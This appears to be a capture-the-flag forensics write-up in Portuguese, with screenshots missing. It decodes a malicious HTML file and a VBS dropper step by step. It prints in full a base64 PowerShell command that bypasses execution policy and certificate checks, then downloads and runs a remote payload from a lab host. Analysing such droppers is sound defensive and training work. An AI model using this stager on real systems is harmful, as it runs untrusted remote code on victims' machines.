#Difficult : Easy #Category : Forensics
***
#### Info
Recebemos um arquivo `HTML` para prosseguir com as investigações.
![[Pasted image 20250519100930.png]]
****
#### 1st URL
Ao abrir o arquivo termos uma string em base64 bem extensa, podemos usar o `CyberCheff` para ver seu real conteúdo.

```bash
nvim wanted.htm
```
![[Pasted image 20250519101452.png]]

Aqui tive que usar um `URL decode` 5 vezes. Até achar o código em `base64`.
![[Pasted image 20250519102104.png]]

Removi o que não fazia parte da string em `base64`, e vi que estava com muitos espaços. Podemos resolver isso com um replace de strings pelo `CyberCheff` ou pelo `nvim`.

Essa `regex` deu um bom resultado.
```nvim
:%s/\v\s{2,}/ /g
```
![[Pasted image 20250519103052.png]]

Agora posso substituir as variáveis de nomes complexos por mais simples como `a` e `b`.
![[Pasted image 20250519103447.png]]

Temos agora uma string em, base64 que podemos obter seu conteúdo pelo terminal. Temos a mesma questão dos espaços, mas podemos ver claramente a `URL` acessada.
![[Pasted image 20250519103652.png]]
#### 2nd URL
Após acessar a `URL` do script, baixamos um arquivo `wanted.tIF`. Que contém um script em `VBS`.
![[Pasted image 20250519104102.png]]

Ele é bem extenso, mais ao final conseguimos ver uma função que faz o decode de uma string e escreve em um arquivo `WScript.shell`. Antes de escrever ele repassa a string para uma função `descortinar` que ao que parece apenas remove a string em `parrana` da string geral.

Então separei apenas a parte das strings codificadas e comecei a trabalhar no `nvim`.
![[Pasted image 20250519104637.png]]


```nvim
:%s/"//g
:%s/\v\n\s{8}arran \= arran \& "//g
```
![[Pasted image 20250519110522.png]]

Após aplicar substituições podemos tentar ver o código usando um decode `base64`.
```
:%s/\v\n\s{8}latifoliado \= latifoliado \& "//g
:%s/d2FudGVkCg//g
```
![[Pasted image 20250519110107.png]]

```sh
echo "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19ycCcpKSkp" | base64 -d
```
![[Pasted image 20250519110615.png]]

Podemos acessar a segunda `URL` para ver o que nos espera.
![[Pasted image 20250519110708.png]]
***
![[Pasted image 20250519110742.png]]